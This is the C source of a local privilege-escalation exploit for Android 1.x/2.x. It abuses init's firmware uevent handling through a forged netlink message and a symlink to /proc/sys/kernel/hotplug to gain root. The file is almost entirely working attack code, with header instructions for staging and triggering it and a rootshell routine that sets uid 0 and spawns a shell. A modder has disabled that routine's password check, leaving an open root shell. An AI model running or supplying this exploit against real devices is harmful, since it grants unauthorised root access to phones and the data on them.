/* android 1.x/2.x the real youdev feat. init local root exploit.
 * (C) 2009/2010 by The Android Exploid Crew.
 *
 * Copy from sdcard to /sqlite_stmt_journals/exploid, chmod 0755 and run.
 * Or use /data/local/tmp if available (thx to ioerror!) It is important to
 * to use /sqlite_stmt_journals directory if available.
 * Then try to invoke hotplug by clicking Settings->Wireless->{Airplane,WiFi etc}
 * or use USB keys etc. This will invoke hotplug which is actually
 * our exploit making /system/bin/rootshell.
 * This exploit requires /etc/firmware directory, e.g. it will
 * run on real devices and not inside the emulator.
 * I'd like to have this exploitet by using the same blockdevice trick
 * as in udev, but internal structures only allow world writable char
 * devices, not block devices, so I used the firmware subsystem.
 *
 * !!!This is PoC code for educational purposes only!!!
 * If you run it, it might crash your device and make it unusable!
 * So you use it at your own risk!
 *
 * Thx to all the TAEC supporters.
 */
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/stat.h>
#include <signal.h>
#include <sys/mount.h>


// CHANGE!
#define SECRET "secret"

char *find_mount(const char *dir);

void die(const char *msg)
{
   perror(msg);
   exit(errno);
}


void copy(const char *from, const char *to)
{
   int fd1, fd2;
   char buf[0x1000];
   ssize_t r = 0;

   if ((fd1 = open(from, O_RDONLY)) < 0)
      die("[-] open");
   if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0)
      die("[-] open");
   for (;;) {
      r = read(fd1, buf, sizeof(buf));
      if (r < 0)
         die("[-] read");
      if (r == 0)
         break;
      if (write(fd2, buf, r) != r)
         die("[-] write");
   }

   close(fd1);
   close(fd2);
   sync(); sync();
}


void clear_hotplug()
{
   int ofd = open("/proc/sys/kernel/hotplug", O_WRONLY|O_TRUNC);
   write(ofd, "", 1);
   close(ofd);
}

void rootshell(char **env, char **argv)
{
   char pwd[128];
   char *sh[] = {"/system/bin/sh", 0};

   /* shakalaca: skip checks { */
   /*
   memset(pwd, 0, sizeof(pwd));
   readlink("/proc/self/fd/0", pwd, sizeof(pwd));

   if (strncmp(pwd, "/dev/pts/", 9) != 0)
      die("[-] memory tricks");

   write(1, "Password (echoed):", 18);
   memset(pwd, 0, sizeof(pwd));
   read(0, pwd, sizeof(pwd) - 1);
   sleep(2);

   if (strlen(pwd) < 6)
      die("[-] password too short");
   if (memcmp(pwd, SECRET, strlen(SECRET)) != 0)
      die("[-] wrong password");
        */
   /* shakalaca: skip checks } */
   
   setuid(0); setgid(0);

   //unlinkTmpFiles();
   execve(*sh, argv, env);
   die("[-] execve");
}

static void
I(const char *msg, ...)
{
    va_list ap;

    va_start(ap, msg);
    vfprintf(stderr, msg, ap);
    va_end(ap);
}

static char *fw_dir = "/data/local/tmp";

static int
senduevent()
{
    char x[512];
    struct sockaddr_nl snl;
    struct iovec iov = {x, sizeof(x)};
    struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
    int s;

    s = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
    if (s < 0)
        return -1;

    snprintf(x, sizeof(x),
                        "ACTION=add\0"
                        "DEVPATH=/..%s\0"
                        "SUBSYSTEM=firmware\0"
                        "FIRMWARE=../../..%s/firmware\0",
                        fw_dir, fw_dir);

    memset(&snl, 0, sizeof(snl));
    snl.nl_pid = 1;
    snl.nl_family = AF_NETLINK;

    if (sendmsg(s, &msg, 0) < 0) {
        close(s);
        return -1;
    }

    return 0;
}

int main(int argc, char **argv)
{
    int fd;
    int sz;

    if (chdir(fw_dir) < 0)
        die("cd to firmware");

    unlink("data");
    /* init will write firmware data to file "data"*/
    if (symlink("/proc/sys/kernel/hotplug", "data") < 0)
        die("create data");

    unlink("loading");
    fd = creat("loading", 0666);
    if (fd < 1)
        die("create loading");
    close(fd);

    unlink("firmware");
    fd = creat("firmware", 0666);
    if (fd < 1)
        die("create firmware");

    sz = strlen(argv[0]);
    if (write(fd, argv[0], sz) != sz)
        die("write firmware");
    close(fd);

    I("Fake firmware ready\n");

    if (senduevent() < 0)
        die("send uevent");

    I("Trigger some uevent to finish root process\n");
}

/*
static void process_firmware_event(struct uevent *uevent)
{
    char *root, *loading, *data, *file1 = NULL, *file2 = NULL;
    int l, loading_fd, data_fd, fw_fd;

    log_event_print("firmware event { '%s', '%s' }\n",
                    uevent->path, uevent->firmware);

    l = asprintf(&root, SYSFS_PREFIX"%s/", uevent->path);
    if (l == -1)
        return;

    l = asprintf(&loading, "%sloading", root);
    if (l == -1)
        goto root_free_out;

    l = asprintf(&data, "%sdata", root);
    if (l == -1)
        goto loading_free_out;

    l = asprintf(&file1, FIRMWARE_DIR1"/%s", uevent->firmware);
    if (l == -1)
        goto data_free_out;

    l = asprintf(&file2, FIRMWARE_DIR2"/%s", uevent->firmware);
    if (l == -1)
        goto data_free_out;

    loading_fd = open(loading, O_WRONLY);
    if(loading_fd < 0)
        goto file_free_out;

    data_fd = open(data, O_WRONLY);
    if(data_fd < 0)
        goto loading_close_out;

    fw_fd = open(file1, O_RDONLY);
    if(fw_fd < 0) {
        fw_fd = open(file2, O_RDONLY);
        if(fw_fd < 0)
            goto data_close_out;
    }

    if(!load_firmware(fw_fd, loading_fd, data_fd))
        log_event_print("firmware copy success { '%s', '%s' }\n", root, uevent->firmware);
    else
        log_event_print("firmware copy failure { '%s', '%s' }\n", root, uevent->firmware);

*/
